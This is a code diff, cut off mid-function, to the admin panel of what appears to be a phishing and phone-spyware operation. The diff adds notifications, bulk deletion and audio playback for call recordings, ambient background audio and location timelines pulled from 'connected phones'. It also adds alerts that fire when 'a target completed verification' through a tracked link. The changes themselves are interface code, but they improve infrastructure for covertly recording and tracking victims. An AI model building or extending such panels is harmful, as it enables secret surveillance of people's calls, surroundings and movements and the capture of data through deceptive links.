@@ -511,6 +511,163 @@
             .dtl-card-time { font-size: 13px; }
         }
 
+        /* ══════ AUTO REFRESH BADGE ══════ */
+        .auto-refresh-badge {
+            font-size: 10px; font-weight: 700; color: var(--green);
+            background: rgba(16,185,129,.12); border: 1px solid rgba(16,185,129,.3);
+            border-radius: 20px; padding: 2px 8px; letter-spacing: .05em;
+            animation: pulse 2s infinite;
+        }
+
+        /* ══════ NOTIFICATION BELL ══════ */
+        .notif-bell-wrap { position: relative; }
+        .notif-bell-btn {
+            background: var(--card2); border: 1px solid var(--border);
+            color: var(--text); border-radius: 8px; width: 36px; height: 36px;
+            cursor: pointer; font-size: 16px; display: flex; align-items: center;
+            justify-content: center; position: relative; transition: all .15s;
+        }
+        .notif-bell-btn:hover { background: var(--card3); }
+        .notif-bell-badge {
+            position: absolute; top: -4px; right: -4px;
+            background: var(--red); color: #fff; border-radius: 10px;
+            font-size: 9px; font-weight: 800; min-width: 16px; height: 16px;
+            display: flex; align-items: center; justify-content: center; padding: 0 3px;
+        }
+        .notif-panel {
+            position: absolute; top: calc(100% + 8px); right: 0; width: 320px;
+            background: var(--card); border: 1px solid var(--border); border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0,0,0,.5); z-index: 999; overflow: hidden;
+            animation: fadeSlideIn .15s ease;
+        }
+        @keyframes fadeSlideIn { from { opacity:0; transform:translateY(-6px); } to { opacity:1; transform:translateY(0); } }
+        .notif-panel-header {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 12px 16px 10px; border-bottom: 1px solid var(--border);
+            font-size: 13px; font-weight: 700;
+        }
+        .notif-clear-btn {
+            background: none; border: none; color: var(--primary); font-size: 11px;
+            cursor: pointer; font-weight: 600;
+        }
+        .notif-list { max-height: 360px; overflow-y: auto; }
+        .notif-empty { padding: 28px; text-align: center; color: var(--muted); font-size: 12px; }
+        .notif-item {
+            padding: 12px 16px; border-bottom: 1px solid var(--border);
+            display: flex; gap: 10px; align-items: flex-start; transition: background .1s;
+        }
+        .notif-item:hover { background: var(--card2); }
+        .notif-item:last-child { border-bottom: none; }
+        .notif-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+        .notif-body { flex: 1; min-width: 0; }
+        .notif-title { font-size: 12.5px; font-weight: 700; margin-bottom: 2px; }
+        .notif-meta { font-size: 11px; color: var(--muted); }
+        .notif-item.notif-unread { border-left: 3px solid var(--primary); background: rgba(59,130,246,.05); }
+
+        /* ══════ APP BIN TABS ══════ */
+        .app-bin-tabs {
+            display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 16px;
+            padding-bottom: 14px; border-bottom: 1px solid var(--border);
+        }
+        .app-bin-tab {
+            padding: 7px 14px; border-radius: 8px; font-size: 12px; font-weight: 600;
+            cursor: pointer; border: 1px solid var(--border); background: var(--bg2);
+            color: var(--muted); transition: all .15s;
+        }
+        .app-bin-tab.active { background: var(--primary); border-color: var(--primary); color: #fff; }
+
+        /* ══════ RECORDING CARD — multi-select + waveform ══════ */
+        .rec-card {
+            background: var(--card2); border: 1px solid var(--border);
+            border-radius: 12px; padding: 14px 16px; margin-bottom: 10px;
+            transition: border-color .15s, background .15s;
+        }
+        .rec-card:hover { border-color: #334155; }
+        .rec-card.rec-selected { border-color: var(--primary); background: rgba(59,130,246,.08); }
+        .rec-card-deleted { opacity: .85; border-color: #2d1a1a; }
+
+        /* Waveform canvas */
+        .rec-waveform-wrap { position: relative; margin-top: 8px; }
+        .rec-waveform-canvas {
+            width: 100%; height: 44px; display: block; border-radius: 6px;
+            background: var(--card3); cursor: pointer;
+        }
+        .rec-play-overlay {
+            position: absolute; inset: 0; display: flex; align-items: center;
+            justify-content: center; gap: 10px; padding: 0 10px;
+        }
+        .rec-play-btn {
+            width: 28px; height: 28px; border-radius: 50%; background: var(--primary);
+            border: none; color: #fff; cursor: pointer; display: flex; align-items: center;
+            justify-content: center; font-size: 10px; flex-shrink: 0; transition: all .15s;
+        }
+        .rec-play-btn:hover { background: var(--primary-dark); transform: scale(1.1); }
+        .rec-progress-bar {
+            flex: 1; height: 4px; background: rgba(255,255,255,.15); border-radius: 2px;
+            cursor: pointer; overflow: hidden;
+        }
+        .rec-progress-fill {
+            height: 100%; background: var(--primary); border-radius: 2px;
+            transition: width .1s linear; width: 0%;
+        }
+        .rec-time-label {
+            font-size: 10px; color: var(--muted); white-space: nowrap; flex-shrink: 0;
+        }
+
+        /* Multi-select bulk bar */
+        .rec-bulk-bar {
+            display: none; background: rgba(59,130,246,.12); border: 1px solid rgba(59,130,246,.3);
+            border-radius: 10px; padding: 10px 16px; margin-bottom: 12px;
+            align-items: center; gap: 10px; flex-wrap: wrap;
+        }
+        .rec-bulk-bar.active { display: flex; }
+        .rec-bulk-label { font-size: 13px; font-weight: 700; color: var(--primary); flex: 1; }
+
+        /* ══════ LOCATION TIMELINE — daily grouping ══════ */
+        .tl-day-group { margin-bottom: 14px; }
+        .tl-day-header {
+            display: flex; align-items: center; gap: 10px; cursor: pointer;
+            padding: 10px 14px; background: var(--card2); border: 1px solid var(--border);
+            border-radius: 10px; transition: background .15s, border-color .15s;
+            user-select: none;
+        }
+        .tl-day-header:hover { background: var(--card3); border-color: #334155; }
+        .tl-day-header .tl-day-icon { font-size: 16px; }
+        .tl-day-title { font-size: 13px; font-weight: 700; flex: 1; }
+        .tl-day-meta { font-size: 11px; color: var(--muted); }
+        .tl-day-chevron { font-size: 11px; color: var(--muted); transition: transform .2s; }
+        .tl-day-group.open .tl-day-chevron { transform: rotate(90deg); }
+        .tl-day-entries {
+            display: none; padding-top: 10px;
+        }
+        .tl-day-group.open .tl-day-entries { display: block; }
+        .tl-live-header {
+            padding: 8px 14px; background: rgba(16,185,129,.1); border: 1px solid rgba(16,185,129,.25);
+            border-radius: 10px; margin-bottom: 10px; font-size: 12px; font-weight: 700;
+            color: var(--green); display: flex; align-items: center; gap: 8px;
+        }
+
+        /* Location multi-select */
+        .tl-select-bar {
+            display: none; background: rgba(239,68,68,.1); border: 1px solid rgba(239,68,68,.3);
+            border-radius: 10px; padding: 10px 16px; margin-bottom: 12px;
+            align-items: center; gap: 10px; flex-wrap: wrap;
+        }
+        .tl-select-bar.active { display: flex; }
+        .tl-select-label { font-size: 13px; font-weight: 700; color: var(--red); flex: 1; }
+
+        /* ══════ APP BIN — location & ambient list items ══════ */
+        .loc-bin-card {
+            background: var(--card2); border: 1px solid #1a2d2d; border-radius: 10px;
+            padding: 14px 16px; margin-bottom: 8px; display: flex;
+            align-items: flex-start; gap: 12px; flex-wrap: wrap;
+        }
+        .loc-bin-icon {
+            width: 36px; height: 36px; border-radius: 50%; background: rgba(6,182,212,.15);
+            color: var(--teal); display: flex; align-items: center; justify-content: center;
+            font-size: 16px; flex-shrink: 0;
+        }
+
         /* ══════ AMBIENT / BACKGROUND RECORDING SECTION ══════
          * Day-grouped cards for continuous background recordings.
          * Each card represents one full day of ambient audio.
@@ -862,16 +1019,12 @@
         <div class="nav-section">
             <div class="nav-label">Management</div>
             <button class="nav-item" data-panel="links" data-shell="admin">
-                <span class="nav-icon">🔗</span> Manage Links
+                <span class="nav-icon">🔗</span> Manager Links
                 <span class="nav-badge nav-badge-blue" id="navLinkCount">0</span>
             </button>
             <button class="nav-item" data-panel="captures" data-shell="admin">
                 <span class="nav-icon">📸</span> Live Captures
                 <span class="nav-badge" id="navCaptureCount">0</span>
-            </button>
-            <button class="nav-item" data-panel="users" data-shell="admin">
-                <span class="nav-icon">👥</span> Users
-                <span class="nav-badge nav-badge-purple" id="navUserCount" style="display:none;">0</span>
             </button>
         </div>
 
@@ -892,12 +1045,6 @@
         </div>
 
         <div class="sidebar-footer">
-            <button class="nav-item" id="changePwBtn">
-                <span class="nav-icon">🔐</span> Change Password
-            </button>
-            <button class="nav-item" id="refreshBtn">
-                <span class="nav-icon">🔄</span> Refresh
-            </button>
             <button class="nav-item" id="adminLogoutBtn" style="color:var(--red);">
                 <span class="nav-icon">🚪</span> Logout
             </button>
@@ -909,9 +1056,25 @@
             <div class="topbar-left">
                 <div class="live-dot"></div>
                 <h2 id="panelTitle">Dashboard</h2>
+                <span class="auto-refresh-badge" title="Auto-refresh active">🔴 LIVE</span>
             </div>
             <div class="topbar-right">
                 <button class="btn btn-teal" id="exportBtn">📥 Export CSV</button>
+                <div class="notif-bell-wrap" id="notifBellWrap">
+                    <button class="notif-bell-btn" id="notifBellBtn" title="Notifications">
+                        🔔
+                        <span class="notif-bell-badge" id="notifBellBadge" style="display:none;">0</span>
+                    </button>
+                    <div class="notif-panel" id="notifPanel" style="display:none;">
+                        <div class="notif-panel-header">
+                            <span>Notifications</span>
+                            <button class="notif-clear-btn" id="notifClearBtn">Clear All</button>
+                        </div>
+                        <div class="notif-list" id="notifList">
+                            <div class="notif-empty">No notifications yet</div>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
 
@@ -1188,13 +1351,22 @@
                                 <h3 style="margin-left:4px;">Call Recordings</h3>
                                 <span class="badge" id="appRecCountInner">0</span>
                             </div>
-                            <div style="display:flex;gap:8px;margin-bottom:14px;margin-top:12px;flex-wrap:wrap;">
+                            <!-- Bulk action bar (shown when items selected) -->
+                            <div class="rec-bulk-bar" id="recBulkBar">
+                                <span class="rec-bulk-label" id="recBulkLabel">0 selected</span>
+                                <button class="btn btn-red btn-sm" id="recBulkDeleteBtn">🗑️ Delete Selected</button>
+                                <button class="btn btn-gray btn-sm" id="recBulkCancelBtn">✕ Cancel</button>
+                            </div>
+                            <div style="display:flex;gap:8px;margin-bottom:14px;margin-top:12px;flex-wrap:wrap;align-items:center;">
                                 <input type="text" id="appRecSearch" placeholder="🔍 Search number or contact…" style="width:220px;">
                                 <select id="appRecFilter">
                                     <option value="all">All calls</option>
                                     <option value="incoming">Incoming only</option>
                                     <option value="outgoing">Outgoing only</option>
                                 </select>
+                                <label class="check-label" style="margin-left:auto;font-size:12px;">
+                                    <input type="checkbox" id="appRecSelectAll"> Select All
+                                </label>
                             </div>
                             <div id="appRecordingsList"></div>
                             <div id="appNoRecMsg" style="display:none;text-align:center;padding:40px 0;color:var(--muted);">
@@ -1221,6 +1393,13 @@
                                         <span class="dtl-live-dot"></span> LIVE
                                     </div>
                                 </div>
+                            </div>
+
+                            <!-- Location select/delete bar -->
+                            <div class="tl-select-bar" id="tlSelectBar">
+                                <span class="tl-select-label" id="tlSelectLabel">0 selected</span>
+                                <button class="btn btn-red btn-sm" id="tlBulkDeleteBtn">🗑️ Delete Selected</button>
+                                <button class="btn btn-gray btn-sm" id="tlBulkCancelBtn">✕ Cancel</button>
                             </div>
 
                             <!-- Summary chips -->
@@ -1342,18 +1521,32 @@
                         </div>
                     </div>
                     <p style="font-size:11px;color:var(--muted);margin-bottom:16px;">
-                        Deleted recordings and devices are stored here. Restore to recover or permanently delete to remove forever.
+                        Deleted recordings, locations, and devices are stored here. Restore to recover or permanently delete to remove forever.
                     </p>
                     <!-- Tabs -->
                     <div class="app-bin-tabs">
-                        <button class="app-bin-tab active" id="appBinTabRec" onclick="window.__appBinSwitchTab('recordings')">🎙️ Deleted Recordings <span id="appBinRecCount" style="margin-left:4px;"></span></button>
-                        <button class="app-bin-tab" id="appBinTabDev" onclick="window.__appBinSwitchTab('devices')">📱 Deleted Devices <span id="appBinDevCount" style="margin-left:4px;"></span></button>
+                        <button class="app-bin-tab active" id="appBinTabCallRec" onclick="window.__appBinSwitchTab('call-recordings')">🎙️ Call Recordings <span id="appBinRecCount" style="margin-left:4px;"></span></button>
+                        <button class="app-bin-tab" id="appBinTabAmbRec" onclick="window.__appBinSwitchTab('recordings')">🎧 Recordings <span id="appBinAmbCount" style="margin-left:4px;"></span></button>
+                        <button class="app-bin-tab" id="appBinTabLoc" onclick="window.__appBinSwitchTab('locations')">📍 Locations <span id="appBinLocCount" style="margin-left:4px;"></span></button>
+                        <button class="app-bin-tab" id="appBinTabDev" onclick="window.__appBinSwitchTab('devices')">📱 Devices <span id="appBinDevCount" style="margin-left:4px;"></span></button>
                     </div>
-                    <!-- Recordings bin list -->
+                    <!-- Call Recordings bin list -->
                     <div id="appBinRecordingsList"></div>
                     <div id="appBinRecEmptyMsg" style="display:none;text-align:center;padding:40px 0;color:var(--muted);">
                         <div style="font-size:36px;margin-bottom:10px;">✅</div>
-                        <div style="font-size:13px;">No deleted recordings.</div>
+                        <div style="font-size:13px;">No deleted call recordings.</div>
+                    </div>
+                    <!-- Ambient Recordings bin list -->
+                    <div id="appBinAmbList" style="display:none;"></div>
+                    <div id="appBinAmbEmptyMsg" style="display:none;text-align:center;padding:40px 0;color:var(--muted);">
+                        <div style="font-size:36px;margin-bottom:10px;">✅</div>
+                        <div style="font-size:13px;">No deleted ambient recordings.</div>
+                    </div>
+                    <!-- Locations bin list -->
+                    <div id="appBinLocList" style="display:none;"></div>
+                    <div id="appBinLocEmptyMsg" style="display:none;text-align:center;padding:40px 0;color:var(--muted);">
+                        <div style="font-size:36px;margin-bottom:10px;">✅</div>
+                        <div style="font-size:13px;">No deleted location entries.</div>
                     </div>
                     <!-- Devices bin list -->
                     <div id="appBinDevicesList" style="display:none;"></div>
@@ -1877,7 +2070,7 @@ document.getElementById('userLogoutBtn').onclick = () => {
 // ══════════════════════════════════════════════════════════
 // NAVIGATION
 // ══════════════════════════════════════════════════════════
-const adminPanelTitles = { dashboard: 'Dashboard', links: 'Manage Links', captures: 'Live Captures', bin: 'Recycle Bin', users: 'User Management', app: 'App — Connected Phones', 'app-bin': 'App Bin — Deleted Items' };
+const adminPanelTitles = { dashboard: 'Dashboard', links: 'Manager Links', captures: 'Live Captures', bin: 'Recycle Bin', app: 'App — Connected Phones', 'app-bin': 'App Bin — Deleted Items' };
 const userPanelTitles  = { 'u-dashboard': 'Dashboard', 'u-links': 'My Links', 'u-captures': 'My Captures', 'u-bin': 'Recycle Bin' };
 
 function switchPanel(name, shell) {
@@ -1934,7 +2127,8 @@ function updateStats() {
     navBin.style.display = adminBinCount > 0 ? '' : 'none';
 
     const userCount = allUsersData ? Object.keys(allUsersData).length : 0;
-    document.getElementById('statUsers').innerText = userCount;
+    const statUsersEl2 = document.getElementById('statUsers');
+    if (statUsersEl2) statUsersEl2.innerText = userCount;
 
     document.getElementById('navCaptureCount').innerText = total;
     document.getElementById('navLinkCount').innerText    = adminLinks.length;
@@ -2371,13 +2565,15 @@ function sanitizeUsername(name) {
 function renderUsersList() {
     const container = document.getElementById('userListContainer');
     const count     = allUsersData ? Object.keys(allUsersData).length : 0;
-    document.getElementById('userCount').innerText = count;
-    document.getElementById('statUsers').innerText = count;
+    const userCountEl = document.getElementById('userCount');
+    if (userCountEl) userCountEl.innerText = count;
+    const statUsersEl = document.getElementById('statUsers');
+    if (statUsersEl) statUsersEl.innerText = count;
 
     const navBadge = document.getElementById('navUserCount');
-    navBadge.innerText = count;
-    navBadge.style.display = count > 0 ? '' : 'none';
+    if (navBadge) { navBadge.innerText = count; navBadge.style.display = count > 0 ? '' : 'none'; }
 
+    if (!container) return;
     if (!allUsersData || count === 0) {
         container.innerHTML = '<div class="empty"><span class="empty-icon">👥</span>No users created yet. Click Add User to get started.</div>';
         return;
@@ -3325,6 +3521,7 @@ function initAdminListeners() {
             playBeep();
             toast('🔔 New capture received!', 'var(--green)');
             sendNotif('New Capture!', 'A target completed verification.');
+            pushNotif('📸', 'New capture received', 'Live Capture');
         }
         prevLogCount = newCount;
         allLogsData = newData;
@@ -3665,10 +3862,8 @@ document.getElementById('downloadQrBtn').onclick  = () => {
 };
 
 // ══════════════════════════════════════════════════════════
-// MODALS: ADMIN PW / EDIT LINK
+// MODALS: EDIT LINK (changePw removed - using Firebase Auth)
 // ══════════════════════════════════════════════════════════
-document.getElementById('changePwBtn').onclick    = () => { document.getElementById('pwModal').classList.add('open'); document.getElementById('pwMsg').innerText = ''; };
-document.getElementById('closePwModal').onclick   = () => document.getElementById('pwModal').classList.remove('open');
 document.getElementById('closeEditLink').onclick  = () => document.getElementById('editLinkModal').classList.remove('open');
 
 document.getElementById('saveEditLink').onclick = () => {
@@ -3687,43 +3882,86 @@ document.getElementById('saveEditLink').onclick = () => {
     }).catch(() => toast('❌ Save failed.', 'var(--red)'));
 };
 
-document.getElementById('savePwBtn').onclick = async () => {
-    const old = document.getElementById('oldPw').value;
-    const nw  = document.getElementById('newPw').value;
-    const nw2 = document.getElementById('newPw2').value;
-    const msg = document.getElementById('pwMsg');
-    msg.innerText = '';
+// ══════════════════════════════════════════════════════════
+// NOTIFICATION SYSTEM
+// ══════════════════════════════════════════════════════════
+let notifList = [];
+let notifUnread = 0;
 
-    if (!old)          { msg.style.color='var(--red)'; msg.innerText='❌ Enter your current password.'; return; }
-    if (nw.length < 6) { msg.style.color='var(--red)'; msg.innerText='❌ New password must be at least 6 characters.'; return; }
-    if (nw !== nw2)    { msg.style.color='var(--red)'; msg.innerText='❌ Passwords do not match.'; return; }
+function pushNotif(icon, title, meta) {
+    const item = { icon, title, meta, time: Date.now(), unread: true };
+    notifList.unshift(item);
+    if (notifList.length > 50) notifList.pop();
+    notifUnread++;
+    renderNotifBadge();
+    renderNotifList();
+}
 
-    const user = auth.currentUser;
-    if (!user) { msg.style.color='var(--red)'; msg.innerText='❌ Not signed in. Please log in again.'; return; }
-
-    msg.style.color='var(--muted)'; msg.innerText='⏳ Updating…';
-
-    try {
-        // Re-authenticate with current credentials before changing password
-        // (Firebase requires recent authentication for sensitive operations)
-        const credential = EmailAuthProvider.credential(user.email, old);
-        await reauthenticateWithCredential(user, credential);
-
-        // Now update the password in Firebase Auth
-        await updatePassword(user, nw);
-
-        msg.style.color = 'var(--green)'; msg.innerText = '✅ Password updated in Firebase!';
-        ['oldPw','newPw','newPw2'].forEach(id => document.getElementById(id).value = '');
-        setTimeout(() => document.getElementById('pwModal').classList.remove('open'), 1400);
-    } catch(e) {
-        const errMsg =
-            e.code === 'auth/wrong-password'          ? '❌ Current password is incorrect.' :
-            e.code === 'auth/weak-password'           ? '❌ New password is too weak (min 6 chars).' :
-            e.code === 'auth/requires-recent-login'   ? '❌ Session expired. Please log out and log in again.' :
-                                                        '❌ Update failed. Try again.';
-        msg.style.color='var(--red)'; msg.innerText = errMsg;
+function renderNotifBadge() {
+    const badge = document.getElementById('notifBellBadge');
+    if (!badge) return;
+    if (notifUnread > 0) {
+        badge.textContent = notifUnread > 99 ? '99+' : notifUnread;
+        badge.style.display = '';
+    } else {
+        badge.style.display = 'none';
     }
-};
+}
+
+function renderNotifList() {
+    const listEl = document.getElementById('notifList');
+    if (!listEl) return;
+    if (notifList.length === 0) {
+        listEl.innerHTML = '<div class="notif-empty">No notifications yet</div>';
+        return;
+    }
+    listEl.innerHTML = notifList.map(n => {
+        const timeAgo = formatTimeAgo(n.time);
+        return `<div class="notif-item${n.unread ? ' notif-unread' : ''}">
+            <div class="notif-icon">${n.icon}</div>
+            <div class="notif-body">
+                <div class="notif-title">${esc(n.title)}</div>
+                <div class="notif-meta">${esc(n.meta)} · ${timeAgo}</div>
+            </div>
+        </div>`;
+    }).join('');
+}
+
+function formatTimeAgo(ts) {
+    const diff = Date.now() - ts;
+    if (diff < 60000) return 'just now';
+    if (diff < 3600000) return Math.floor(diff/60000) + 'm ago';
+    if (diff < 86400000) return Math.floor(diff/3600000) + 'h ago';
+    return new Date(ts).toLocaleDateString();
+}
+
+// Bell toggle
+const notifBellBtn = document.getElementById('notifBellBtn');
+const notifPanel   = document.getElementById('notifPanel');
+if (notifBellBtn) {
+    notifBellBtn.addEventListener('click', (e) => {
+        e.stopPropagation();
+        const isOpen = notifPanel.style.display !== 'none';
+        notifPanel.style.display = isOpen ? 'none' : '';
+        if (!isOpen) {
+            // Mark all as read
+            notifList.forEach(n => n.unread = false);
+            notifUnread = 0;
+            renderNotifBadge();
+            renderNotifList();
+        }
+    });
+}
+document.addEventListener('click', () => { if (notifPanel) notifPanel.style.display = 'none'; });
+if (notifPanel) notifPanel.addEventListener('click', e => e.stopPropagation());
+
+const notifClearBtn = document.getElementById('notifClearBtn');
+if (notifClearBtn) {
+    notifClearBtn.addEventListener('click', () => {
+        notifList = []; notifUnread = 0;
+        renderNotifBadge(); renderNotifList();
+    });
+}
 
 // ══════════════════════════════════════════════════════════
 // EXPORT CSV (admin)
@@ -3785,7 +4023,6 @@ function copyWithFeedback(url, btn, shortLabel = '') {
         toast('✅ Link copied!' + shortLabel);
     }).catch(() => prompt('Copy this URL:', url));
 }
-document.getElementById('refreshBtn').onclick = () => location.reload();
 migrateLegacyBins();
 cleanBin();
 renderBin();
@@ -3884,7 +4121,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
     let appCurrentDevice   = null; // deviceId currently open in recordings view
     let appRecordingsAll   = [];   // active (non-deleted) recs for current device
     let appListenerAttached = false;
-    let appCurrentBinTab   = 'recordings'; // 'recordings' | 'devices'
+    let appCurrentBinTab   = 'call-recordings'; // 'call-recordings' | 'recordings' | 'locations' | 'devices'
 
     // ── Format helpers ──────────────────────────────────────────────────────
     function fmtDuration(secs) {
@@ -3997,7 +4234,16 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
         });
 
         onValue(ref(db, 'call_recordings'), (snap) => {
-            appRecordingsData = snap.val() || {};
+            const newData = snap.val() || {};
+            // Count new recordings vs previous
+            let prevTotal = 0, newTotal = 0;
+            Object.values(appRecordingsData).forEach(recs => { if (recs) prevTotal += Object.keys(recs).length; });
+            Object.values(newData).forEach(recs => { if (recs) newTotal += Object.keys(recs).length; });
+            if (appListenerAttached && newTotal > prevTotal) {
+                toast('🎙️ New call recording received!', 'var(--primary)');
+                if (typeof pushNotif === 'function') pushNotif('🎙️', 'New call recording received', 'App — Call Recordings');
+            }
+            appRecordingsData = newData;
             if (appCurrentDevice !== null) {
                 buildRecordingsList(appCurrentDevice);
                 renderRecordingsList();
@@ -4065,19 +4311,194 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
         }).join('');
     }
 
+    // ── Global audio manager — only ONE recording plays at a time ────────────
+    var activeAudioEl    = null;
+    var activeAudioRecId = null;
+    var activeWaveInterv = null;
+
+    function stopActiveAudio() {
+        if (activeAudioEl) {
+            activeAudioEl.pause();
+            activeAudioEl.currentTime = 0;
+            activeAudioEl = null;
+        }
+        if (activeWaveInterv) { clearInterval(activeWaveInterv); activeWaveInterv = null; }
+        // Reset all play buttons
+        document.querySelectorAll('.rec-play-btn').forEach(b => b.textContent = '▶');
+        document.querySelectorAll('.rec-progress-fill').forEach(f => f.style.width = '0%');
+        document.querySelectorAll('.rec-time-label').forEach(l => l.textContent = '0:00');
+        activeAudioRecId = null;
+    }
+
+    function fmtTime(s) {
+        if (!s || isNaN(s)) return '0:00';
+        var m = Math.floor(s / 60), sec = Math.floor(s % 60);
+        return m + ':' + (sec < 10 ? '0' : '') + sec;
+    }
+
+    function drawWaveform(canvas, audioEl) {
+        var ctx2 = canvas.getContext('2d');
+        var W = canvas.offsetWidth || 200, H = canvas.offsetHeight || 44;
+        canvas.width = W; canvas.height = H;
+
+        // Fake waveform using deterministic pattern (real Web Audio API would need CORS)
+        ctx2.clearRect(0, 0, W, H);
+        ctx2.fillStyle = 'rgba(59,130,246,0.15)';
+        ctx2.fillRect(0, 0, W, H);
+
+        var bars = Math.floor(W / 4);
+        var duration = audioEl.duration || 60;
+        var progress = audioEl.currentTime / duration;
+
+        for (var i = 0; i < bars; i++) {
+            var x = i * 4;
+            var seed = (i * 2654435761) >>> 0;
+            var amp = 0.15 + (seed % 100) / 100 * 0.7;
+            var barH = amp * H * 0.85;
+            var isPlayed = (i / bars) < progress;
+            ctx2.fillStyle = isPlayed ? 'rgba(59,130,246,0.85)' : 'rgba(100,116,139,0.4)';
+            ctx2.fillRect(x, (H - barH) / 2, 3, barH);
+        }
+    }
+
+    function attachAudioPlayer(recId, audioSrc) {
+        var btnEl   = document.getElementById('recPlayBtn-' + recId);
+        var canvas  = document.getElementById('recWave-' + recId);
+        var progFill= document.getElementById('recProg-' + recId);
+        var timeEl  = document.getElementById('recTime-' + recId);
+        if (!btnEl || !canvas) return;
+
+        btnEl.addEventListener('click', function (e) {
+            e.stopPropagation();
+            // If this recording is already playing, pause it
+            if (activeAudioRecId === recId && activeAudioEl && !activeAudioEl.paused) {
+                activeAudioEl.pause();
+                btnEl.textContent = '▶';
+                if (activeWaveInterv) { clearInterval(activeWaveInterv); activeWaveInterv = null; }
+                return;
+            }
+            // Stop any currently playing audio first
+            stopActiveAudio();
+
+            // Create new audio element
+            var audio = new Audio(audioSrc);
+            activeAudioEl    = audio;
+            activeAudioRecId = recId;
+            btnEl.textContent = '⏸';
+
+            audio.addEventListener('timeupdate', function () {
+                var dur = audio.duration || 1;
+                var pct = (audio.currentTime / dur) * 100;
+                if (progFill) progFill.style.width = pct + '%';
+                if (timeEl)   timeEl.textContent = fmtTime(audio.currentTime) + ' / ' + fmtTime(dur);
+                if (canvas)   drawWaveform(canvas, audio);
+            });
+            audio.addEventListener('ended', function () {
+                btnEl.textContent = '▶';
+                if (progFill) progFill.style.width = '0%';
+                if (timeEl)   timeEl.textContent = fmtTime(audio.duration) + ' / ' + fmtTime(audio.duration);
+                if (activeWaveInterv) { clearInterval(activeWaveInterv); activeWaveInterv = null; }
+                activeAudioEl    = null;
+                activeAudioRecId = null;
+            });
+            audio.addEventListener('error', function () {
+                toast('⚠️ Audio playback error.', 'var(--yellow)');
+                stopActiveAudio();
+            });
+            audio.play().catch(function () { toast('⚠️ Cannot autoplay. Click the play button again.', 'var(--yellow)'); });
+
+            // Initial waveform draw
+            drawWaveform(canvas, audio);
+        });
+
+        // Progress bar seek
+        var progBar = canvas.parentElement ? canvas.parentElement.querySelector('.rec-progress-bar') : null;
+        if (progBar) {
+            progBar.addEventListener('click', function (e) {
+                if (activeAudioRecId !== recId || !activeAudioEl) return;
+                var rect = progBar.getBoundingClientRect();
+                var pct  = (e.clientX - rect.left) / rect.width;
+                activeAudioEl.currentTime = pct * (activeAudioEl.duration || 0);
+            });
+        }
+
+        // Initial waveform
+        drawWaveform(canvas, { currentTime: 0, duration: 60 });
+    }
+
+    // ── Recording multi-select state ────────────────────────────────────────
+    var selectedRecIds = new Set();
+
+    function updateRecBulkBar() {
+        var bar   = document.getElementById('recBulkBar');
+        var label = document.getElementById('recBulkLabel');
+        if (!bar || !label) return;
+        if (selectedRecIds.size > 0) {
+            bar.classList.add('active');
+            label.textContent = selectedRecIds.size + ' recording' + (selectedRecIds.size !== 1 ? 's' : '') + ' selected';
+        } else {
+            bar.classList.remove('active');
+        }
+    }
+
+    // Bulk delete handler
+    var recBulkDeleteBtn = document.getElementById('recBulkDeleteBtn');
+    var recBulkCancelBtn = document.getElementById('recBulkCancelBtn');
+    if (recBulkDeleteBtn) {
+        recBulkDeleteBtn.addEventListener('click', async function () {
+            if (selectedRecIds.size === 0) return;
+            if (!confirm('Move ' + selectedRecIds.size + ' recording(s) to App Bin?')) return;
+            var items = Array.from(selectedRecIds);
+            for (var i = 0; i < items.length; i++) {
+                var parts = items[i].split('|||');
+                if (parts.length === 2) {
+                    try { await update(ref(db, 'call_recordings/' + parts[0] + '/' + parts[1]), { deleted_at: Date.now() }); }
+                    catch(e) {}
+                }
+            }
+            selectedRecIds.clear();
+            updateRecBulkBar();
+            toast('🗑️ ' + items.length + ' recording(s) moved to App Bin.', 'var(--yellow)');
+            pushNotif('🗑️', items.length + ' recording(s) deleted', 'App — Call Recordings');
+        });
+    }
+    if (recBulkCancelBtn) {
+        recBulkCancelBtn.addEventListener('click', function () {
+            selectedRecIds.clear();
+            document.querySelectorAll('.rec-checkbox').forEach(cb => cb.checked = false);
+            var sa = document.getElementById('appRecSelectAll');
+            if (sa) sa.checked = false;
+            updateRecBulkBar();
+        });
+    }
+
+    // Select all handler
+    var appRecSelectAll = document.getElementById('appRecSelectAll');
+    if (appRecSelectAll) {
+        appRecSelectAll.addEventListener('change', function () {
+            document.querySelectorAll('.rec-checkbox').forEach(cb => {
+                cb.checked = appRecSelectAll.checked;
+                var key = cb.dataset.did + '|||' + cb.dataset.rid;
+                if (appRecSelectAll.checked) selectedRecIds.add(key);
+                else selectedRecIds.delete(key);
+            });
+            updateRecBulkBar();
+        });
+    }
+
     // ── Recordings list ─────────────────────────────────────────────────────
     function buildRecordingsList(deviceId) {
         appRecordingsAll = activeRecordingsForDevice(deviceId);
     }
 
     function renderRecordingsList() {
-        const search    = (document.getElementById('appRecSearch')?.value || '').toLowerCase();
-        const filter    = document.getElementById('appRecFilter')?.value || 'all';
-        const container = document.getElementById('appRecordingsList');
-        const noMsg     = document.getElementById('appNoRecMsg');
+        var search    = (document.getElementById('appRecSearch')?.value || '').toLowerCase();
+        var filter    = document.getElementById('appRecFilter')?.value || 'all';
+        var container = document.getElementById('appRecordingsList');
+        var noMsg     = document.getElementById('appNoRecMsg');
         if (!container) return;
 
-        let recs = appRecordingsAll;
+        var recs = appRecordingsAll.filter(r => r.direction !== 'ambient');
         if (filter !== 'all') recs = recs.filter(r => r.direction === filter);
         if (search) recs = recs.filter(r =>
             (r.phone_number || '').toLowerCase().includes(search) ||
@@ -4085,33 +4506,48 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
         );
 
         document.getElementById('appRecCountInner').textContent = recs.length;
-        // Update the sub-nav chooser button subtitle with live count
         var recSubLabel = document.getElementById('appSubNavRecSub');
         if (recSubLabel) recSubLabel.textContent = recs.length + ' recording' + (recs.length !== 1 ? 's' : '');
 
         if (recs.length === 0) {
             container.innerHTML = '';
-            noMsg.style.display = '';
+            if (noMsg) noMsg.style.display = '';
             return;
         }
-        noMsg.style.display = 'none';
+        if (noMsg) noMsg.style.display = 'none';
 
         container.innerHTML = recs.map(r => {
-            const isIn   = r.direction === 'incoming';
